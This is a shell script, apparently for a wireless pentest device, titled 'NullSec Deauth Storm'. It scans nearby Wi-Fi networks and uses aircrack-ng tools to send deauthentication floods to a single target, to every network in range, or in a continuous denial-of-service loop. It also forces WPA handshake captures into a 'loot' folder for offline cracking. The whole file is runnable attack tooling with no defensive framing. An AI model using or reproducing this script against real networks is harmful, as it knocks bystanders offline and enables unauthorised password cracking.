#!/bin/sh
#===============================================================================
#  NULLSEC DEAUTH STORM - Mass Deauthentication Attack
#===============================================================================

LOOT_DIR="/mmc/nullsec/captures"
LOG_FILE="/root/nullsec/logs/deauth_$(date +%Y%m%d_%H%M%S).log"
IFACE="${IFACE:-wlan1mon}"

mkdir -p "$LOOT_DIR" "$(dirname $LOG_FILE)"

log() { echo "[$(date '+%H:%M:%S')] $1" | tee -a "$LOG_FILE"; }

# Scan for targets
scan_targets() {
    log "Scanning for targets..."
    timeout 30 airodump-ng "$IFACE" --write-interval 5 -w /tmp/nullsec_scan --output-format csv 2>/dev/null &
    sleep 30
    killall airodump-ng 2>/dev/null
    
    echo ""
    echo "=== AVAILABLE TARGETS ==="
    cat /tmp/nullsec_scan-01.csv 2>/dev/null | grep -E "^[0-9A-F]" | head -20
}

# Deauth single target
deauth_target() {
    local bssid="$1"
    local client="${2:-FF:FF:FF:FF:FF:FF}"
    local count="${3:-0}"
    
    log "Deauthing $bssid (client: $client, count: $count)"
    aireplay-ng -0 "$count" -a "$bssid" -c "$client" "$IFACE" 2>&1 | tee -a "$LOG_FILE"
}

# Deauth all networks in range
deauth_all() {
    local count="${1:-100}"
    log "Deauth storm - attacking all networks!"
    
    # Get all BSSIDs
    airodump-ng "$IFACE" --write-interval 3 -w /tmp/deauth_scan --output-format csv 2>/dev/null &
    sleep 10
    killall airodump-ng 2>/dev/null
    
    # Extract BSSIDs and attack each
    cat /tmp/deauth_scan-01.csv 2>/dev/null | grep -oE '([0-9A-F]{2}:){5}[0-9A-F]{2}' | sort -u | while read bssid; do
        log "Attacking $bssid..."
        aireplay-ng -0 "$count" -a "$bssid" "$IFACE" &
        sleep 0.5
    done
    
    wait
    log "Deauth storm complete!"
}

# Targeted deauth with handshake capture
deauth_capture() {
    local bssid="$1"
    local channel="$2"
    
    [[ -z "$bssid" || -z "$channel" ]] && { echo "Usage: $0 capture <BSSID> <CHANNEL>"; exit 1; }
    
    log "Targeting $bssid on channel $channel for handshake capture..."
    
    # Set channel
    iwconfig "$IFACE" channel "$channel"
    
    # Start capture
    airodump-ng -c "$channel" --bssid "$bssid" -w "$LOOT_DIR/handshake_$(echo $bssid | tr ':' '-')" "$IFACE" &
    local dump_pid=$!
    
    sleep 5
    
    # Send deauths
    log "Sending deauth packets..."
    for i in $(seq 1 5); do
        aireplay-ng -0 10 -a "$bssid" "$IFACE" 2>&1 | tee -a "$LOG_FILE"
        sleep 3
    done
    
    # Check for handshake
    sleep 5
    kill $dump_pid 2>/dev/null
    
    if aircrack-ng -a2 "$LOOT_DIR/handshake_"*.cap 2>/dev/null | grep -q "1 handshake"; then
        log "HANDSHAKE CAPTURED!"
        ls -la "$LOOT_DIR"/handshake_*.cap | tail -1
    else
        log "No handshake captured yet. May need more attempts."
    fi
}

# Continuous deauth (DoS mode)
deauth_dos() {
    local bssid="$1"
    
    [[ -z "$bssid" ]] && { echo "Usage: $0 dos <BSSID>"; exit 1; }
    
    log "Starting continuous DoS on $bssid (Ctrl+C to stop)..."
    
    while true; do
        aireplay-ng -0 50 -a "$bssid" "$IFACE" 2>&1 | tee -a "$LOG_FILE"
        sleep 1
    done
}

case "${1:-scan}" in
    scan) scan_targets ;;
    target) shift; deauth_target "$@" ;;
    all) shift; deauth_all "$@" ;;
    capture) shift; deauth_capture "$@" ;;
    dos) shift; deauth_dos "$@" ;;
    *)
        echo "NullSec Deauth Storm"
        echo "Usage: $0 <command> [options]"
        echo ""
        echo "Commands:"
        echo "  scan                    - Scan for targets"
        echo "  target <BSSID> [CLIENT] [COUNT] - Deauth specific target"
        echo "  all [COUNT]             - Deauth all networks (storm)"
        echo "  capture <BSSID> <CH>    - Deauth + capture handshake"
        echo "  dos <BSSID>             - Continuous deauth (DoS)"
        ;;
esac
